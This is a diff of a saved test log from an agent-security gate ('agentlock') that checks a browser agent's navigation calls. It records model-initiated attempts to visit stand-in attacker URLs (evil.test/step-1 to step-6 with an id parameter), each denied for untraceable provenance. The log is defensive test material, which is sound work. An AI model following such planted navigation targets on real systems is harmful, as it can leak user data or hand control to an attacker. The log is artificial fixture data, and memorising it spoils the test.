     "confirmation": "declined",
     "decided_by": "agentlock_gate",
@@ -1524,7 +1379,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_3619271c268541874877b935",
+    "receipt_id": "rcpt_db78c8cfb42845d44a41d197",
     "target": ""
   },
   "ok": false,
@@ -1539,7 +1394,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-4ed24308",
+    "audit_id": "agentlock-2026-08-26-db1b9903",
     "channel": "MODEL",
     "confirmation": "cap_reached",
     "decided_by": "agentlock_gate",
@@ -1548,7 +1403,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_cd28da3e5e95f726b483d212",
+    "receipt_id": "rcpt_327ac7a9d9859b5d5a64aa99",
     "target": ""
   },
   "ok": false,
@@ -1577,19 +1432,19 @@ log_events = ['provenance', 'provenance', 'provenance', 'decision', 'decision', 
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-86d1b342", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_a474e12494f280a19496ec61", "role": "operator", "signature": "534fdd7c90e7e8f1e79a07157b12506c7cb5693a6999cd23f80dfb7370818484", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.6439779, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404044.6440454, "value": "http://fixture.test/index.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-3a610916", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-1?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-1?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "756da781d24e147084d4e35bf1530bcb0086a1141d761bc8812ac53b390bc9e7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_a80970b0d9bbed41684a2c0e", "role": "operator", "signature": "f301e9e42482a30deab057e18b0ded5778e5dc6c94192922eb0b1816d8619136", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.6709664, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6710417, "value": "http://evil.test/step-1?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-3a610916", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-1?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce228230b89499", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-1?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "756da781d24e147084d4e35bf1530bcb0086a1141d761bc8812ac53b390bc9e7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_a80970b0d9bbed41684a2c0e", "role": "operator", "signature": "f301e9e42482a30deab057e18b0ded5778e5dc6c94192922eb0b1816d8619136", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.6709664, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.672808, "value": "http://evil.test/step-1?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-ef39299b", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-2?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-2?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "bfa4eeba8ee57c2da1466bc45c3b22cb7e2f65af40c64568f8e8c389a6342912", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_71cf02ed4a1dc04b9f2fa6f8", "role": "operator", "signature": "223bd63592744acf25e6336500ee0d001abc31b9201327188535388e4b450341", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.675319, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.675412, "value": "http://evil.test/step-2?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-ef39299b", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-2?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce228230fb97c8", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-2?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "bfa4eeba8ee57c2da1466bc45c3b22cb7e2f65af40c64568f8e8c389a6342912", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_71cf02ed4a1dc04b9f2fa6f8", "role": "operator", "signature": "223bd63592744acf25e6336500ee0d001abc31b9201327188535388e4b450341", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.675319, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6768608, "value": "http://evil.test/step-2?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-43b53867", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-3?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-3?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "01af056f91e1df06ff39c00dadcb71d911a7db4365a1355d0f48f5a6655ce109", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_e5878ccdbe9f5a309a0912a7", "role": "operator", "signature": "e8f0b8213260b544349053a459ab8a71c5e456f806e958282f6de2b19a123915", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.679388, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6794314, "value": "http://evil.test/step-3?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-43b53867", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-3?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce22823137b6e4", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-3?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "01af056f91e1df06ff39c00dadcb71d911a7db4365a1355d0f48f5a6655ce109", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_e5878ccdbe9f5a309a0912a7", "role": "operator", "signature": "e8f0b8213260b544349053a459ab8a71c5e456f806e958282f6de2b19a123915", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.679388, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6802416, "value": "http://evil.test/step-3?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-4a9c3b3e", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-4?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-4?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "e05c7faca6bd977b684e72fb418a9cb2e587a4296997ecfaa7fa47b7e69d260d", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_9c56c10eb008e12f4a41a905", "role": "operator", "signature": "69a10104c05d42e75827a72e459265e95b279be230d8d3049c1d6e7f1321823b", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.681936, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.681973, "value": "http://evil.test/step-4?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-4a9c3b3e", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-4?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce2282315e815e", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-4?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "e05c7faca6bd977b684e72fb418a9cb2e587a4296997ecfaa7fa47b7e69d260d", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_9c56c10eb008e12f4a41a905", "role": "operator", "signature": "69a10104c05d42e75827a72e459265e95b279be230d8d3049c1d6e7f1321823b", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.681936, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6831646, "value": "http://evil.test/step-4?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-7931ee33", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-5?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-5?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "134536532ee355974ebcecacf39302b66861de6f296f42a302d238be288369c7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_3619271c268541874877b935", "role": "operator", "signature": "1bbec2aa2007f2fd61931e0ae9c8eae28561a80b6a8e626f17af8e5e3af8cb68", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.6854105, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6854558, "value": "http://evil.test/step-5?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-7931ee33", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-5?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18ce228231939bd9", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-5?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "134536532ee355974ebcecacf39302b66861de6f296f42a302d238be288369c7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_3619271c268541874877b935", "role": "operator", "signature": "1bbec2aa2007f2fd61931e0ae9c8eae28561a80b6a8e626f17af8e5e3af8cb68", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.6854105, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6862433, "value": "http://evil.test/step-5?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-4ed24308", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-6?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-6?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9771877e1a142d22d99a4e47a5219163c0f2e5a743a599793573ecf61e325a4", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_cd28da3e5e95f726b483d212", "role": "operator", "signature": "85d77e5f25dd6082f322121eb4338297b9d3f15136bc12b142796dce133f6e50", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.688028, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6880653, "value": "http://evil.test/step-6?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-4ed24308", "cause": "tool", "channel": "MODEL", "confirmation": "cap_reached", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-6?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-6?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:24Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9771877e1a142d22d99a4e47a5219163c0f2e5a743a599793573ecf61e325a4", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_cd28da3e5e95f726b483d212", "role": "operator", "signature": "85d77e5f25dd6082f322121eb4338297b9d3f15136bc12b142796dce133f6e50", "signing_key_id": "agentlock-browser", "timestamp": 1787404044.688028, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404044.6881685, "value": "http://evil.test/step-6?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-96293617", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_758cb0a9baa788aa17c33bc6", "role": "operator", "signature": "ec55f3b6fc2ee309b5af34718e18b980f3bbb9c810870bc3396cac0e184ee5d6", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.5521297, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758126.5521913, "value": "http://fixture.test/index.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-b111c6cb", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-1?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-1?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "756da781d24e147084d4e35bf1530bcb0086a1141d761bc8812ac53b390bc9e7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_bec3819c97e297c944f8b6b5", "role": "operator", "signature": "ea186c43a39a440234f37bcff01c282a5f9f163e7d4b1027b2e7dda6df773a91", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.576934, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.5770702, "value": "http://evil.test/step-1?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-b111c6cb", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-1?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf648b4ef47af8", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-1?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "756da781d24e147084d4e35bf1530bcb0086a1141d761bc8812ac53b390bc9e7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_bec3819c97e297c944f8b6b5", "role": "operator", "signature": "ea186c43a39a440234f37bcff01c282a5f9f163e7d4b1027b2e7dda6df773a91", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.576934, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.5783408, "value": "http://evil.test/step-1?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-4f4866d2", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-2?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-2?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "bfa4eeba8ee57c2da1466bc45c3b22cb7e2f65af40c64568f8e8c389a6342912", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_e150fbfd0f1454e71893caba", "role": "operator", "signature": "e7e7f24f07d8654df31b0463593ed4eb6ecb3dad0640887618b1986d4fd3c2bc", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.580624, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.5806592, "value": "http://evil.test/step-2?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-4f4866d2", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-2?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf648b4f29756d", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-2?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "bfa4eeba8ee57c2da1466bc45c3b22cb7e2f65af40c64568f8e8c389a6342912", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_e150fbfd0f1454e71893caba", "role": "operator", "signature": "e7e7f24f07d8654df31b0463593ed4eb6ecb3dad0640887618b1986d4fd3c2bc", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.580624, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.5813875, "value": "http://evil.test/step-2?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-b977d59a", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-3?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-3?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "01af056f91e1df06ff39c00dadcb71d911a7db4365a1355d0f48f5a6655ce109", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_0db94fdb7994dcf4cbd93195", "role": "operator", "signature": "8dbf093f3352a366a1ad6ea2081fbda418494cfbd31186c89faf07592f2827ac", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.5826895, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.582722, "value": "http://evil.test/step-3?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-b977d59a", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-3?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf648b4f48c8ca", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-3?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "01af056f91e1df06ff39c00dadcb71d911a7db4365a1355d0f48f5a6655ce109", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_0db94fdb7994dcf4cbd93195", "role": "operator", "signature": "8dbf093f3352a366a1ad6ea2081fbda418494cfbd31186c89faf07592f2827ac", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.5826895, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.5834699, "value": "http://evil.test/step-3?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-dc881e9d", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-4?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-4?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "e05c7faca6bd977b684e72fb418a9cb2e587a4296997ecfaa7fa47b7e69d260d", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_2d0a8c2648c7edf963f74941", "role": "operator", "signature": "498d76005b5594eae0bbb8ada3afbe4809af4c87fed49d9d396f9b74ca8d771f", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.5847363, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.584769, "value": "http://evil.test/step-4?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-dc881e9d", "cause": "tool", "channel": "MODEL", "confirmation": "declined", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-4?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "elic_18cf648b4f6810b0", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-4?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "e05c7faca6bd977b684e72fb418a9cb2e587a4296997ecfaa7fa47b7e69d260d", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_2d0a8c2648c7edf963f74941", "role": "operator", "signature": "498d76005b5594eae0bbb8ada3afbe4809af4c87fed49d9d396f9b74ca8d771f", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.5847363, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.585435, "value": "http://evil.test/step-4?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-5aca5e5e", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/step-5?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/step-5?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:46Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "134536532ee355974ebcecacf39302b66861de6f296f42a302d238be288369c7", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_db78c8cfb42845d44a41d197", "role": "operator", "signature": "fd407969d290dca737b0ebe71a57d0dca576cdaf728066cf25ee3ac358f0a3f2", "signing_key_id": "agentlock-browser", "timestamp": 1787758126.5867639, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758126.586796, "value": "http://evil.test/step-5?id=7731"}
